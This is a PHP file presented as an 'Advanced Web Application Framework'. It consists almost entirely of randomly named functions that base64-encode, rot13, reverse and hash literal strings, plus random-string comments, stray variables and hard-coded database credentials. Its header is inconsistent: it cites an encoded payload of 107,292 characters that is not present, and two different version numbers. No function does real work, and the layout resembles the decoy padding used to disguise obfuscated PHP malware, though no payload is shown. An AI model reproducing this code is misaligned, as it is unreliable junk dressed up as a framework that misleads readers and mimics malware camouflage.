<?php
/*
 * Advanced Web Application Framework
 * Generated: 2025-09-04 15:25:00
 * Version: 2.0.20
 * License: MIT License
 * Original size: 79732 bytes
 * Encoded size: 107292 chars
 */

// Framework Constants
define('FRAMEWORK_VERSION', '5.3.2');
define('DEBUG_MODE', false);
define('CACHE_ENABLED', true);
define('SESSION_TIMEOUT', 6538);


// Database Configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'yf832isp');
define('DB_PASS', 'a9TJQOl0NUsf');
define('DB_NAME', '4mhLqwS1qO');

class LPnqNfQWwwSu {
    private $qsE9expr;
    private $sMfQhT5a;
    
    public function __construct() {
        $luSbvz = DB_HOST;
        $fhWqC5 = DB_USER;
        // caoHfZBkUJJ7NMQpTLVuN17iAo3BUT0QskxvG2eJ
    }
    
    public function ISYFHOstrG() {
        // hnHsjrMYS1aLtGvp4cTvoxnhmHSTRpRhaXauWpAdflMKLFrXAT
        return true;
    }
}


// Utility Functions
function aDMMR6Vr6dKA($input) {
    $sanitized = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    $trimmed = trim($sanitized);
    // v8ALPvjyM62mx9Vr2QCmc4Y8a4wVOfNVovP5W8wWgjfNL
    return $trimmed;
}

function jO2dfwrvse($file) {
    if (file_exists($file)) {
        $content = file_get_contents($file);
        // MksRjxkmfCQqjHUbukkouCPgQJ3SiaKlSyJ
        return $content;
    }
    return false;
}

function zYiICI3iCHVPnwz($data) {
    $json = json_encode($data);
    $compressed = gzcompress($json);
    // Ebc7Fy7WwAmjlMEtOfh6GQdZWL5j99Upe9aSnXBhvUmr9t2AF0RTXmN
    return base64_encode($compressed);
}


function MiSkAQLp() {
    $HmFql05 = 'eqtLigeF9kNfvsX7MO';
    $PSR8CRsa = function($PEhuTJX) {
        // 0rK1ygrVorVthOcnAOWuhNIZ3xEVzjY9xIID6k
        return base64_encode($PEhuTJX);
    };
    // 24R6pyKgRGM1av5HW9D5
    return $PSR8CRsa($HmFql05);
}


function uFYX12dU2hA($L1XG5ALNV5) {
    $xEUT281J = base64_encode($L1XG5ALNV5);
    $UKwWO = str_rot13($xEUT281J);
    // TyfGlFXlChSbbCTY2g98epDs6y9xTpQr8FJ
    if (strlen($UKwWO) > 10) {
        // hck5RcH3WVw75pdHHQ2Yx83kscuOHCaALMfBXqs
        return hash('sha256', $UKwWO);
    }
    return false;
}


function J67MyvoHslSv5CLMp() {
    $zbl2PgPa = 'p7YZUq4SuhJlLj1FytB';
    $I1yQeq = strrev($zbl2PgPa);
    // wDaVcM9INxTaz0DmbaJkR2mY8DZglfWQxyDFWuu1E8vTGAutzEunVANC
    return md5($I1yQeq);
}


function MSvPMtjGhnWWBBb1gpN() {
    $rVLnq1Xoy3 = 'UpYGRzNzolFBZ';
    $gUc51jXuP = strrev($rVLnq1Xoy3);
    // AFaBHwwMTf3vK7cu8N5gpVM8qvxE0aAaN0PRoB
    return md5($gUc51jXuP);
}


function rFBHXI9KW($uCdVQw) {
    $Zik3dk = base64_encode($uCdVQw);
    $h9hOTDA = str_rot13($Zik3dk);
    // kS7nzksOu6xCAEw1LDwPlRkXGkjn5cHgv0vNbak
    if (strlen($h9hOTDA) > 10) {
        // PpvlTZATPdlHhoyOz7vVcWlo
        return hash('sha256', $h9hOTDA);
    }
    return false;
}


function I8nhtg9MfJXUZm3jn($Wzu6yDLtg) {
    $s5py8Ozy = base64_encode($Wzu6yDLtg);
    $p3HEs = str_rot13($s5py8Ozy);
    // HPLRJhYY4fSLjJSGR3uSkREhk6YXv4Z4
    if (strlen($p3HEs) > 10) {
        // Tw9SsISFs2FhuIjFUjnBBloALW6zHrnW9
        return hash('sha256', $p3HEs);
    }
    return false;
}


function eRmyzL8OM($hJRP1SNzoS) {
    $Mo9lTLa93 = base64_encode($hJRP1SNzoS);
    $kTZlxS = str_rot13($Mo9lTLa93);
    // EGUjbZBNgfYm93N0xSUradgYpSim94WOpR5KWV
    if (strlen($kTZlxS) > 10) {
        // eMcXA1cwwA73XlWS5zWOSIewYe63I
        return hash('sha256', $kTZlxS);
    }
    return false;
}


function EHFS4mczmpLEA($mGc2yb) {
    $LlSo4vqOaf = base64_encode($mGc2yb);
    $g4gj9PHf1 = str_rot13($LlSo4vqOaf);
    // w4vWl6fyiDa4dAwaNLhPv16oIlC4ssi9ngCZeLpmIDD4ugHgpo
    if (strlen($g4gj9PHf1) > 10) {
        // V3beKO6mKfiEUcLUiSM9
        return hash('sha256', $g4gj9PHf1);
    }
    return false;
}


function Rp0wZoTvFXH1nt9pn6() {
    $X9wsFbO = 'iZ0zlbKsoHg3B';
    $xNhsHHyOdy = strrev($X9wsFbO);
    // dW5IUxVA63JppYlSfO7iDjgEB604OnEzavOOyB1oVm5KjZ4YJZ
    return md5($xNhsHHyOdy);
}


function G1h0CG4LtC1Rz($t4DrYpJ) {
    $CoCUWXD65w = base64_encode($t4DrYpJ);
    $QAOKAPK = str_rot13($CoCUWXD65w);
    // EXWxXW9fyqGdKOURkOrkrX0XZpsVIUKpqOqhjkkbYXswyL
    if (strlen($QAOKAPK) > 10) {
        // FWGNRaBfy8TOq509W0pGBp4EBrCjJ7Zyagnjl0
        return hash('sha256', $QAOKAPK);
    }
    return false;
}


function y2nJ34kmDCjly0M6l9y($ErBzSnWkK) {
    $IGkdESOV = base64_encode($ErBzSnWkK);
    $iDKHV3Z = str_rot13($IGkdESOV);
    // RKklWNE1skoTHmWEMulE85KvzTcIqhLYHlV93wCJC8fkHdoujIcpnv
    if (strlen($iDKHV3Z) > 10) {
        // Fy7U3OnyLo4X4mJmXQHxYT6Dc4neRoo
        return hash('sha256', $iDKHV3Z);
    }
    return false;
}


function unruMhM4U($JBdGdY) {
    $KyywIHb4wD = base64_encode($JBdGdY);
    $BZU1sp4V8b = str_rot13($KyywIHb4wD);
    // MwDo9NTR9lc4AuckG6AIq77SVTUuzxYpMSM
    if (strlen($BZU1sp4V8b) > 10) {
        // R87uwolB7YP7q4sbkrPZBBlOGszXe3ow
        return hash('sha256', $BZU1sp4V8b);
    }
    return false;
}


function ipVVM2O5IA0ft0HzUNg() {
    $j6Iju = 'aB5FH3IbklEx2';
    $hJyTAWaU = function($fHvG8) {
        // GMFbAq22oUCBZCj1VK0Xs0ER6RgwnWKQLe2C1CR1HEnlJ
        return base64_encode($fHvG8);
    };
    // 0i7wjKyIJRKB77y6Urx0bBOyaO09dh5mORmKD
    return $hJyTAWaU($j6Iju);
}


function ILT7FxmQj6w1MpwM8it() {
    $kxQUZ = 'MudkfF6FXmc8';
    $Ap52uD = strrev($kxQUZ);
    // cihYMdR5wz2ov4oqjzK2x1R34tf1OnF71QoMdtCcv4V5AE8R6dLODa83
    return md5($Ap52uD);
}


function tSC3yfPY($nCaxzFJ) {
    $p6Awygb = base64_encode($nCaxzFJ);
    $I7d8mXSn = str_rot13($p6Awygb);
    // mBnOZWXhPw5LZhs6NvAllk0hhHMg24Xs1fO3ZknCYy3u
    if (strlen($I7d8mXSn) > 10) {
        // KJBM2axsnN3MBWfIOBwgSqM
        return hash('sha256', $I7d8mXSn);
    }
    return false;
}


function nYhMYjfhD3hRJeIsKK() {
    $YSVjaw4S = 'dwlhe4O67be8DjSQxUNeRlos';
    $nlzOb = function($dqIhjQ) {
        // RZDtwcILh9PqIOXMD92MU2kHsAk04v
        return base64_encode($dqIhjQ);
    };
    // yruUCDDPvjsEZ48O64yAdmADwNODbDjT
    return $nlzOb($YSVjaw4S);
}


function UAe4NdEv7m2() {
    $nhZk4IZsCX = 'w2EghVd9zeLVokQhV1seRo15';
    $n2NWSsz7jf = function($njRWRXtjHU) {
        // 2MrhVcek3LawOENMosxrgtSlPPcsY7gkeUypQeBmSeG99L15IiipbYrLht
        return base64_encode($njRWRXtjHU);
    };
    // GGJri24yiPsjJRl7U42S0nqvLCcw
    return $n2NWSsz7jf($nhZk4IZsCX);
}


function DPFTiZwueY9($FQ7UrL) {
    $lGyw3Thv = base64_encode($FQ7UrL);
    $sOcLEFFn = str_rot13($lGyw3Thv);
    // xhigyqQcNo5xrz2HtHQPkMHiVFTQWVUswMl8fWr5OSpLLyTOVMiEXUQwl
    if (strlen($sOcLEFFn) > 10) {
        // CuP4jvyZFVHbAu4yK2lrd9P1cyYowN8
        return hash('sha256', $sOcLEFFn);
    }
    return false;
}


function H8EleK6UQm58kbJ3() {
    $Bzkl31O = 'iFka8NPMYzdxTX5IOS';
    $wu9LF6P = strrev($Bzkl31O);
    // BpQj8PkXlUMXLtxum7L2XoRDwKXBigXjMn6TY7rxYqtx6TejrJMLg
    return md5($wu9LF6P);
}


function EXesiOJJaT65Xi8mLs() {
    $OEuL61 = 'osi2lThp0Msn95YS9l8';
    $EzbpS = strrev($OEuL61);
    // f74dWm3mIcBgmRUffpafWGwkrQOtgaRg8tOUcoIX8hThaQCCiFaG
    return md5($EzbpS);
}


function o33qq6T6pd1YhMcI($PDGdH6F7E) {
    $ovk23s0 = base64_encode($PDGdH6F7E);
    $LsM9dZ7 = str_rot13($ovk23s0);
    // 1zIb2xXoJqZQsU9ztAXRRPK3CafVDMoNSDIL4YSqwPOLOZwfP
    if (strlen($LsM9dZ7) > 10) {
        // YVMTCsShegukge7pj6qqfSs6ucl5q9VzvKg7
        return hash('sha256', $LsM9dZ7);
    }
    return false;
}


function RKnKp4Y46kCCcvDuIY1n($YWXWvPZb0) {
    $HpnmGZ2mld = base64_encode($YWXWvPZb0);
    $VqGlUEdG6 = str_rot13($HpnmGZ2mld);
    // 5nb5acXoCAYJTbdCQqIV4X5TNVUDlaujQ1
    if (strlen($VqGlUEdG6) > 10) {
        // Y5vnMgPGQPWoPGPAUGlFk5FGEktjNmxubZ2X
        return hash('sha256', $VqGlUEdG6);
    }
    return false;
}


function PvqoN0XNaj9W() {
    $a4lnnW4MCg = 'LQFeKFUaLZCX3DfTcf0I';
    $iGysIv = strrev($a4lnnW4MCg);
    // 4fFdNSR5drmrAo91EFM33wUdCkJ72gIYfA0fYWTrJfLFhlKmz3vd4h8PtQG
    return md5($iGysIv);
}


function dqS853GTIASWtvLrmc() {
    $OiPam9LC = 'AhRlGR6qFasYC3leX';
    $TftsO2G1mO = function($m9VMa4WzS) {
        // pAPYubXK0Qvn4ysfnlTUXawtEkHTlvKvFsjitKlYEDjGM
        return base64_encode($m9VMa4WzS);
    };
    // qNRyz7AJtyG0QfZFlHEp5lgXU7pN
    return $TftsO2G1mO($OiPam9LC);
}


function eIrwBrkI7KxeB6sb() {
    $ikrF0yaC4d = 'mKk5SHbhDbFxaYQz';
    $JGAoQKT = strrev($ikrF0yaC4d);
    // SCojnIRpteX8GfrINMIwgtpTbGiLNv27hHsV
    return md5($JGAoQKT);
}


function wyaQZ21G7CG($zs6SU5BJ4J) {
    $o59adyY = base64_encode($zs6SU5BJ4J);
    $emDufAjMy = str_rot13($o59adyY);
    // FjhRxOiQAIewYHrZsvC3WAygqB3pA9pokfG57lO5aaWq9WzC5zElxvxG
    if (strlen($emDufAjMy) > 10) {
        // ed59eDXfwXIKDSEtuKhu2
        return hash('sha256', $emDufAjMy);
    }
    return false;
}


function EGKXDyTIIrOAL5Tz() {
    $tWOhQH8yot = 'AEcqdrzoi5axpZW';
    $FCUSs8 = strrev($tWOhQH8yot);
    // Yyd56YxFmHzTzSdP0GCH5qrzn8YSZwGv04nAc
    return md5($FCUSs8);
}


function rljw6mvZPeq() {
    $X4zJfG3BKh = 'SivcizJU0cV6lpfMDRoP3xOk';
    $tGDye = function($IJXxEMQ) {
        // ydxpU8Ff0NdK9DW63bvWt7ajKzIG5TlTsg3xsT4R0IoFmGaWCbeZlXHV
        return base64_encode($IJXxEMQ);
    };
    // 9MxzIyjjrktpLDqh7QflTo4lO
    return $tGDye($X4zJfG3BKh);
}


function YB40H3jVfk() {
    $Hm376lTT = 'OtqOknSNty';
    $irUk2 = strrev($Hm376lTT);
    // Hb5HLjO44cCST9dOWLEO9kJeBouWHXDkvB
    return md5($irUk2);
}


function XRwpByWpdvwKd2($ztSAl6n) {
    $kTwUvbLk = base64_encode($ztSAl6n);
    $JRPRnNOEF = str_rot13($kTwUvbLk);
    // kQ2rHo82x5oXkfuANtnWojfgs3FYO8qiZaoOuKaIi6tyB2dY
    if (strlen($JRPRnNOEF) > 10) {
        // BwoSxkpIr7FgvRP1pDK0piGRQoKFw
        return hash('sha256', $JRPRnNOEF);
    }
    return false;
}


function jUVRoNCf2AyFzQ3AQ() {
    $EafrGPmbOB = '4GQKu6pJA1PBHu';
    $DSVCXGzhO = function($w14MaRVS5) {
        // WJLQQXkMKFJlc2gi8ySgUNLuh5sYkcFAVLIAzXlwNe2t5xSbX60CL3ck
        return base64_encode($w14MaRVS5);
    };
    // JLLuPT5reinOqQtIOT7NWTebJbGPX7CkgJ9YS
    return $DSVCXGzhO($EafrGPmbOB);
}


function ZmZdhGwtW3gL() {
    $zd9xeV = 'LXz8knjeZtH';
    $hytHxP7DPp = function($OO2Lh) {
        // FPCNeH16XWfcHHAlbQ9O6BOzyZQegga7HvHWRVLXLCvWVIBg
        return base64_encode($OO2Lh);
    };
    // 7OFg6XmBw47wgsCvE3qyHZiO4AvJO6Tjqyo
    return $hytHxP7DPp($zd9xeV);
}


function oncI71l7zgcnVSSIkot() {
    $bvkTvl = 'Wkk8SQ5xVlKRTPYBfil';
    $QtHxPEH1 = strrev($bvkTvl);
    // slFa68pJw1hFrdv85xx9lkfl4Z94eMY8TdgFFVtw
    return md5($QtHxPEH1);
}


function shZxYtJ0CBfBbJ() {
    $nPHX8lj = 'vGNs9OkrWGWQTf6KqIpHWH';
    $coIxs = function($IX0IHPG9T) {
        // grf4F2XPxzTroyeU8GEVfMbdUxd8iDK
        return base64_encode($IX0IHPG9T);
    };
    // wIIZLlr15JBPt7r4s4j718Eays0fPmEq
    return $coIxs($nPHX8lj);
}


function qEy3MHdbVcKp() {
    $pStIsZTn = 'REGm2xSCZJGM';
    $vn46dTB8f = function($ED336Hie9) {
        // Fj8dA0LP48evOYh6pQAoBP6hlfZiIR7FXUz
        return base64_encode($ED336Hie9);
    };
    // sAOUYNCiExrwxwGl5Nu6889yQ
    return $vn46dTB8f($pStIsZTn);
}


function oQyYl7n0S4T() {
    $LaUqIFQPtX = 'zW1T263vUdXy1FRsxbCn8TP2';
    $xqsO1 = function($nsS9k3skf) {
        // HewozhWpRdAiCJHqWBd4RXtnuxCt7mJhWjhPqRDQNxBfAbDLrs
        return base64_encode($nsS9k3skf);
    };
    // ArS38ORjLub7YcqgkRU4Bc9MxI0uHxcZxCGnvzpr
    return $xqsO1($LaUqIFQPtX);
}


function VanrwyjZjzRgs() {
    $RnyiHI4GI = 'aVRr5qQ2XxWXpUfjLNjRYx';
    $hgsOhhioi7 = strrev($RnyiHI4GI);
    // r7WD9uAWDJnglgBk64GRaBjNMtI8LtWZZhEZkWrsi
    return md5($hgsOhhioi7);
}


function n9TxASRd0sME($M1KUj) {
    $c77ASk5Wg = base64_encode($M1KUj);
    $tJrLxbgXd2 = str_rot13($c77ASk5Wg);
    // y8VxCYW5Es91o1nlog6HJGJfCdiqeVoktIj6CwJ
    if (strlen($tJrLxbgXd2) > 10) {
        // MiScPcumkqaEtSRzsgEDs0LqerKq9yBEKE2k
        return hash('sha256', $tJrLxbgXd2);
    }
    return false;
}


function QxR1zIe2UvBpPq0Pmc() {
    $jJSWU0zv = '2O6dNI0pXyEXuuGB8';
    $XbFVeQiC8 = strrev($jJSWU0zv);
    // nKEhfLOBOijWv2NYB3SUCKL5UjQf7j0zCxgAEGSLRQeEEhOj
    return md5($XbFVeQiC8);
}


function GrZJZ5x6H7j($I4Xk1) {
    $KxF5uMT = base64_encode($I4Xk1);
    $VMFgG = str_rot13($KxF5uMT);
    // z7fXZy9rfs4VWWqHfm386wF9GhOuUmjdhfEK
    if (strlen($VMFgG) > 10) {
        // TJlX5wTMXnhhfQiFr045w5NIYXTICLkSlGie1Lp
        return hash('sha256', $VMFgG);
    }
    return false;
}


function oubwtXfYN3QNkt8($Nf0WkNO) {
    $CRaNoJ = base64_encode($Nf0WkNO);
    $BLQfzbz = str_rot13($CRaNoJ);
    // 2h3HqyfBKyjh7pgsL9ut41eq4XU2jrIrzN3Q
    if (strlen($BLQfzbz) > 10) {
        // WcPtKlDsPUMB3NN1Q7Dvh6zXkFzYT7LcGWHJycwc
        return hash('sha256', $BLQfzbz);
    }
    return false;
}


function P3IRlt1SYVxnRZYdFE() {
    $cVprkC = 'jbrXxfw8kjt3Svd2b5JIc';
    $FFl0rMo = strrev($cVprkC);
    // xRNqpQJARdUUm0HKN0hnAJnyWMCujZu95I5ViU
    return md5($FFl0rMo);
}


function Qi8g9VbbMosmL() {
    $lgdSw4Jp = 'B0umnCNHgW';
    $tmOsGg = function($hWd6Bjz) {
        // gATgj8TDSNj0XH3Knk8FLbjH859TPuZE78Wxs0zj
        return base64_encode($hWd6Bjz);
    };
    // jSObUGr3qD9vprprIdi74JNdM72NYVIe5uMyb
    return $tmOsGg($lgdSw4Jp);
}


function rjpyRwP8HDDFsb() {
    $beOKBmskI = '6wpmMlNEkYaff1nA';
    $PJhTB = strrev($beOKBmskI);
    // Yq9Sv1hzuVWWKaHcPLNtON1Na7juZg49jH7K4EEVB5isj0CywW2dodq0FE8
    return md5($PJhTB);
}


function eHAPK6Nd($RIlLE2by) {
    $KEnZVuN = base64_encode($RIlLE2by);
    $Ge1q89ci = str_rot13($KEnZVuN);
    // SVg4895MT5PYAlC1UmldPeN8dqMadDdJ6RiY
    if (strlen($Ge1q89ci) > 10) {
        // yACYC7RMBPZHMqjOazP3kEV
        return hash('sha256', $Ge1q89ci);
    }
    return false;
}


function jya1vRKaOGSMs6jkv($eYLIcZE) {
    $S1Ylo = base64_encode($eYLIcZE);
    $L7yfIt2QB = str_rot13($S1Ylo);
    // 4jdJ9He4taHWnXC5BqxsneQ52NNPr7edhlJfhlT9td
    if (strlen($L7yfIt2QB) > 10) {
        // rh1JhqAZibRljuYqh6FWcY
        return hash('sha256', $L7yfIt2QB);
    }
    return false;
}


function iOdIBX8pl($kfG4SBW6Ya) {
    $JltO0ju = base64_encode($kfG4SBW6Ya);
    $or9oC0qz = str_rot13($JltO0ju);
    // dKqDn18igRCRcGwUJLY4ACb1sySvC4LT5oMQ69Jz2k2Jf
    if (strlen($or9oC0qz) > 10) {
        // kZeX2gHsDGjVDm9BYrhmIY90
        return hash('sha256', $or9oC0qz);
    }
    return false;
}


function mIlcq5BKq($iuUmXqXj) {
    $JO8Mk = base64_encode($iuUmXqXj);
    $o1FJ5W = str_rot13($JO8Mk);
    // 10AnHoZvs16T4Y3lG5qHdNTHTa9GprPls
    if (strlen($o1FJ5W) > 10) {
        // QZV98kqz6SxhZhrHNqNiDGllI
        return hash('sha256', $o1FJ5W);
    }
    return false;
}


function yOi4VQGZB() {
    $xg3gJXZ = 'ojkx3t1JhdqtWHgP6W';
    $Qcih9Pi = strrev($xg3gJXZ);
    // QsIVPopJ0oCLsW2Vc1C6Vj7nNmGWDtKhdYF7rOFD9i0BFkgRfEUD4pjl4qs
    return md5($Qcih9Pi);
}


function caB1OCSYl() {
    $MQNblra = 'lFdK1YFib3sAgbb';
    $jImsoACJyJ = strrev($MQNblra);
    // fzXFbgIqOq92Kt1FWtmwjAOrUlb3caJeFIwc2Brk4TAjPjKNdt1
    return md5($jImsoACJyJ);
}


function Ny1Xv5t535P7q0oheyq($sEnUDts1Va) {
    $AYETZEWhyW = base64_encode($sEnUDts1Va);
    $YwZiz = str_rot13($AYETZEWhyW);
    // DqD7kEREHMcZwxN0spupf7GsIcOh5tz1N1mrNj1BSBH1
    if (strlen($YwZiz) > 10) {
        // VnhiEQotfRJzjwueirqGI7qI1wiQMOhvy
        return hash('sha256', $YwZiz);
    }
    return false;
}


function bI2qZoPb0h($piyDZ5) {
    $FcHwnpaJz5 = base64_encode($piyDZ5);
    $WioR3L = str_rot13($FcHwnpaJz5);
    // jnBYDd8hmb9CaciHQQEQ5lFUE0OUhiunF3LrjH7Mzxo6USOnAEJbL
    if (strlen($WioR3L) > 10) {
        // WpoIEDusOB6OECVnDHlZN1Z
        return hash('sha256', $WioR3L);
    }
    return false;
}


function r9DCg117n($h56XOS2qNZ) {
    $wjx2e1c5K = base64_encode($h56XOS2qNZ);
    $EpyBiuN0LP = str_rot13($wjx2e1c5K);
    // Z1CVWntzC3pBt7nbmTSmpfxMasHhUk0E1
    if (strlen($EpyBiuN0LP) > 10) {
        // iZY5LdN7j8xHGa9DhnedCkiozu5F9zXmK2H9lE
        return hash('sha256', $EpyBiuN0LP);
    }
    return false;
}


function tdQfODAwnrxZ1() {
    $NuPnO44sy = '3N227am905g';
    $tyLR0nuu = strrev($NuPnO44sy);
    // csJhLVrK8htRa5vu0B9Oe97oqCwQ4iYjnAl8H4Ogurl9utsMA9liT6ms5c
    return md5($tyLR0nuu);
}


function uSVH5OXqHgDhpq() {
    $LNBkaWK = 'IvVoUPx0TqfcuBtZy1';
    $btQO7 = function($Zmx47M2) {
        // m5puBxWf9wpSRQvq08GESfWlf5G0TGk2nGbt
        return base64_encode($Zmx47M2);
    };
    // 0lLw6spO6vnq2TYX0pxQqn3IflzGeNS
    return $btQO7($LNBkaWK);
}


function mQwAmefpF() {
    $ltXPrx = 'Aj3M8WQRFjPqYTli73xUd';
    $UCc1OtO = strrev($ltXPrx);
    // 9wLjYabgE0vRTLdma1DRoUZnoD9fmfC0wc4yhqOeRV4NKc5WWkdKVf2
    return md5($UCc1OtO);
}


function rbJZvwbzE31zZi($ZeiHM8UOHh) {
    $Us7kt9VfgY = base64_encode($ZeiHM8UOHh);
    $o6K0T = str_rot13($Us7kt9VfgY);
    // zMu9NSRKX0QHTCbGNjGStdr1eLb8hyPrJJAIyUG
    if (strlen($o6K0T) > 10) {
        // ub6uKUko8ArWVyWDyQM5VlqHBMuBXsPTAYF
        return hash('sha256', $o6K0T);
    }
    return false;
}


function ZcNwdIzT6bfLcC() {
    $KRI91 = 'RYCuZhKQNaLTz9';
    $yL0Lf = strrev($KRI91);
    // Eb7p3MzzuRPzyNU5b6E91UfYPxC5HT33V8wcsXBSMolUc
    return md5($yL0Lf);
}


function i13FPiphj8pBkSvq() {
    $I9LYRDkrgJ = 'qwomrP3qjQhodPU0ZLqaX';
    $XJj1p = strrev($I9LYRDkrgJ);
    // 7RmS25XJRVZVVKzbYAFefIKcP7LY2uLxMRxg151MXq6lapk
    return md5($XJj1p);
}


function sIQYDhMvA5E13($rDpJrPi9M2) {
    $bwitW0LwCw = base64_encode($rDpJrPi9M2);
    $f1M2P = str_rot13($bwitW0LwCw);
    // Ikg4SxHV1uXDp7KlV2tgqy9UTg5e5hjgtkK6xjGQOIEXby01uz4QJKFGqe8g
    if (strlen($f1M2P) > 10) {
        // L7CtTdpgSEvzHflx76NRAmMC01RURMVC
        return hash('sha256', $f1M2P);
    }
    return false;
}


function kOQAJju48FZE3nT() {
    $txcSZ = 'euUv0TQw1AEZW3v';
    $TuzUm = strrev($txcSZ);
    // g1gGZgqDF3VGEqAjol22aRZcApUMHuUhiNN2umlR
    return md5($TuzUm);
}


function Tb5MQjEUp0() {
    $p8k1ou0j = 'QUhd8kIzYeJWHByXEW';
    $K1k3E2S0e = strrev($p8k1ou0j);
    // oKD3QQIP5wyxWMQqI2GoLdg5yozw859nTREDZoZJc46rMcqUd
    return md5($K1k3E2S0e);
}


function fZbs0AYT8f706Nd() {
    $uO9uElF = 'C0U887Vx0Bf4TSz';
    $HL1SFLOfYI = function($X9J63PcLi) {
        // cjcK5XAAE1OxWpcagJjp6AIx8IU2b5o3vWGSrW
        return base64_encode($X9J63PcLi);
    };
    // YW8Ivqlh6hnCe9VMBAEePvA
    return $HL1SFLOfYI($uO9uElF);
}


function mbWI1oXmNVPfJ4Wt1Hwx($OVNFrH) {
    $pJ2YZBlc = base64_encode($OVNFrH);
    $MtSIn = str_rot13($pJ2YZBlc);
    // ZolwIELoWh3npqNDLTxpsNct7Esw08iS3
    if (strlen($MtSIn) > 10) {
        // jSd0IzwTLhD1ZPfNb5Eob2b
        return hash('sha256', $MtSIn);
    }
    return false;
}


function VfwYcTu34IpL() {
    $AEKWuWp = 'vmZLTKWxAEznEbtpIp8OGAP';
    $Qg9tb0 = strrev($AEKWuWp);
    // K5u1BDj8RuOQFIJ1EFLhIMWRcYHOKsDKuPA
    return md5($Qg9tb0);
}


function by4vthZuKWYV325dqdVC($oFEoNW7VD) {
    $ybz1y = base64_encode($oFEoNW7VD);
    $a4woxwJ = str_rot13($ybz1y);
    // YvjPugWmNBipaEIyJgxwvkk4SiQsuNgwRJpBsK45w
    if (strlen($a4woxwJ) > 10) {
        // yiNcPiRboCXCx2n5VeF9VOYQ2beoQonWlcKHR
        return hash('sha256', $a4woxwJ);
    }
    return false;
}


function hcp8QENf() {
    $ujlajWuQ = 'xIQlRS2wiuUJ62o1w1ar';
    $buA2vjj8Y4 = function($wiRncIIxxc) {
        // J8roKNwX4TgS9OAtbPf6niosZsg5OrxMiSA5qQWNWgkmLWABIEzUaL
        return base64_encode($wiRncIIxxc);
    };
    // MfbES7wDndNQEHd7Z47DvfnKSfiJ
    return $buA2vjj8Y4($ujlajWuQ);
}


function MEhiEIlnxrX2hi() {
    $MhMHyEWHHY = 'nPZJmGYxSzL1';
    $TbXDh5g = strrev($MhMHyEWHHY);
    // MwCCqMoprSWXlnK4ZhiG8kuc5JqpPjecAlUwhBdd3kDbnazdG
    return md5($TbXDh5g);
}


function raXQ0lepG($dhtH5YIRBj) {
    $nh6Fdke3rn = base64_encode($dhtH5YIRBj);
    $Bhx75NRE7 = str_rot13($nh6Fdke3rn);
    // CFJNOgpbF7T921VFxBGqM2QYtX0LPxN0ZG46rZAlsmuyppNlWL2DMhLqTZh
    if (strlen($Bhx75NRE7) > 10) {
        // vI5oBVKkjUynNofXO6chDUxjUEBs306uG
        return hash('sha256', $Bhx75NRE7);
    }
    return false;
}


function mgzk7UOHhNCTZ() {
    $G42LxnGGk = 'XjaETSyVgLrVyPC9sZ7iL';
    $RK4NO = strrev($G42LxnGGk);
    // xtGvtYE5YCMGj5z2iDchDYzecOIMw4Zlc8ZCrA7FvweEMhCnQN2PSR
    return md5($RK4NO);
}


function MW59Hf4Hv04w7yCTj7L() {
    $ws8YzlAq0 = '2aNhmuMfw4ubO5DTcnX';
    $JPzD4b = strrev($ws8YzlAq0);
    // UYKjDKM3SEUMyx5tNKGtjeCu5kVCH5bRtE1doiH5ILEJEshv5wyJdd
    return md5($JPzD4b);
}


function xO6eQxT7y4tD() {
    $qfyMx = 'folnHQeXl1BynMm';
    $ugb6SPs = function($DrjXpZuBa) {
        // ZlzRBFWjIeXrcWXZkFEdCn4QBkdFZhiljdFYhch8GY8Q0
        return base64_encode($DrjXpZuBa);
    };
    // uwB43QM8uIz6ZgiMIR8QJJO
    return $ugb6SPs($qfyMx);
}


function nBg1iD2P() {
    $vPmHOWHa = 'Ts5zqNkIumVhsM84JPbiqJ';
    $rGPb6uCOq = strrev($vPmHOWHa);
    // tQPGU3UvxVPh5ykCxJcQ5a2VIwAKRdWACJZCX
    return md5($rGPb6uCOq);
}


function GIGu1KEnW1Kv($YQsBtgYx) {
    $dummy = 'JaWUTi7PTpM5CK0ySoxzClFwydwaWWKKlBXi1Xv4k1JRBtkg0F';
    $processed = base64_decode($dummy);
    // B3y2X2teRgyeQzo0NrlTqGMNUFk5o03ZZuumz31n
    return strlen($processed);
}


function eZllQhf2SHXN($kK3INtZc) {
    $dummy = 'nXCHMdbT9nJ7947bDB2Um0tzMMHajnib7rGAVvFDMUu3rPDkC5';
    $processed = base64_decode($dummy);
    // cGw9LNwmXdvJfSTq70qB6WBa4iSuCHZnr066KW5Y
    return strlen($processed);
}


function MkWzMRCrvzZI($RuX4C5n5) {
    $dummy = 'p2Pthm7MzfvrGR4x3YmzKb3Ctg6EIbxutSeWom5EHJHkFJFnPH';
    $processed = base64_decode($dummy);
    // STY7CBkwzT8RVcDMYCmpyR06BTKZl1a7tAQULz3k
    return strlen($processed);
}


function soChq5S7z1LM($TdLx53N1) {
    $dummy = 'QXoXKaqnxoyAeHiNTKpBWaxWRaTdNUmJE4fQ8rUrLn1cSvXanC';
    $processed = base64_decode($dummy);
    // sJZY9cEZTAJLqpndx1kH8fItX93KZbVwfBBnazym
    return strlen($processed);
}


function zYQyuNBjQQNP($aJF4NaGb) {
    $dummy = '9mEhxwBh6lEgWFxSFvc1h8USkYEf9dMJmaJ9YSTXOy9hWlx0ri';
    $processed = base64_decode($dummy);
    // Q5sKCDnxPEliHg6OOntcAapTAV4qqvMdY9xOq3qe
    return strlen($processed);
}

$uoB32G3aaVxpdJ='e3Y6BVFF4qf4S6JVaaekGEJ3NIde6PWR2XStM';
// hFEFcH852D1aPwBC6Z5MQzAGIMlFFhl2mUF6rUR6CUCHVv
$WinnGJvHz='EckWO87T696xlfq19rdshuLWjSeCty';
// hvBxFWZYZ35SswP68S0F5DZS0uMfgeuHwLBviQ5ayxpfMq60GMJ2EFt2zpiAQhXBSwlLy3Zid
$SBJD9lQvHE6Tc='7WM1Xo4rOFQ5msUUwguab6Y4dLIa';
// llZymFTUkdXFd8swUCsX4DAHRl1DB0XhmtSGRFYhkknYFNcxS1M8lRneggDPuqFiKbJYWmNQ9F74ls5
$Sc7BLxgd9cdLxD='CyDjosptrrL4HCIeOjwKjokEMUL2IXK9Ma4HWruxd42h66bfZfcOqu7vCj';
$wChmmGKPg5U1='mSUkaPoI16hGhSbgkJlmai8vIUYs';
// PLPRxL0op38TZeoCFaRYANcZKuPDc5iuSgTLafhxyC0KwdNyJqfRummlIjSvRpRWZ2sXn063Z8bpsn
$U27rdbOdqe='4szTNPQHCUxW8Nj8VGojECpgUrWoBFJDgXn';
